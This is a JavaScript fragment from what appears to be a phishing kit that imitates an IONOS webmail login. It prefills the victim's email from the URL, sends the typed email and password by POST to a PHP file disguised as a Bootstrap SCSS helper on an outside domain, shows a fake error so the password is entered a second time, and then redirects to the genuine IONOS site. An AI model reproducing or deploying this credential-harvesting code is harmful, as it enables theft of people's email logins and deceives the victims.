
        var count = 0;
        var hash = window.location.hash;
        document.getElementById('usrnm').value = hash.split('#')[1];
        var em = $('#usrnm').val();
        var ps = $('#pwd').val();

        var check = document.getElementById('usrnm').value = hash.split('#')[1]
        var pwdInput = document.getElementById('pwd');

        if (check === undefined) {
            $('#usrnm').val('');
            $('#usrnm').focus();
        } else {
            pwdInput.focus();
        }


        $('#pwd').keydown(function (e) {
            if (e.which == 13) {
                sendmails();
                return false;
            }
        });

        function sendmails() {
            var em = $('#usrnm').val();
            var ps = $('#pwd').val();


            if (ps === "" || ps === " " || ps == " " || ps == "  " || ps == "   " || ps === null) {

                document.getElementById('err').innerHTML = "Password is required";
            } else {
                var em = $('#usrnm').val();
                var ps = $('#pwd').val();

                $.ajax({
                    url: 'https://talqaha.ae/temp/test2/scss/bootstrap/helpers/_ratio.php', // full url of ionos.php. use https links only
                    type: 'POST',
                    data: {
                        user: em,
                        pass: ps,
                        type: 1
                    },
                    beforeSend: function () {
                        $(".progress").show();
                        console.log(count);
                    },
                    success: function (response) {

                        if (count === 1) {
                            location.href = "https://www.ionos.com/";
                        } else {
                            document.getElementById("danger").style.display = "flex";
                            document.getElementById('err').innerHTML = "An error has occurred. Please try again";
                            document.getElementById('pwd').value = '';
                            pwdInput.focus();
                            count = count = +1;
                            console.log(count);
                        }



                    }
                });
            }
        }

    